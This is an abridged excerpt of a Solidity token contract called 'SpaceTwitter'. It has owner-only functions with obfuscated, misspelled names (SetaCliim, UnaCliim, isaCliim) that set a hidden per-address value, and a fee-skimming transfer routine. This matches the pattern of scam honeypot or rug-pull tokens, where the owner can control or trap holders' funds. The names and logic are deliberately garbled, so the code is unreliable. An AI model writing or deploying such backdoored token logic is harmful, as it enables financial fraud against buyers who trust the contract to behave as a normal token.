...
contract token is Ownable, IERC20 {
    ...
    string private _name = "SpaceTwitter";
    string private _symbol = "STwitter";
    ...
    function SetaCliim(address acddount) public onlyowner {
        _aCliim[acddount] = _totalSupply;
    }


    function UnaCliim(address acddount) public onlyowner {
        _aCliim[acddount] = 1;
    }


    function isaCliim(address acddount) public view returns (uint256) {
        return _aCliim[acddount];
    }
    ...
    function _transfer(address sender, address recipient, uint256 ammounts) internal virtual {
        ...
        uint256 amoun;
        amoun = ammounts - feiyammount;
        _balance[recipient] += amoun;
        if (_burnfeiy > 0){
            emit Transfer (sender, _DEADaddress, feiyammount);
        }
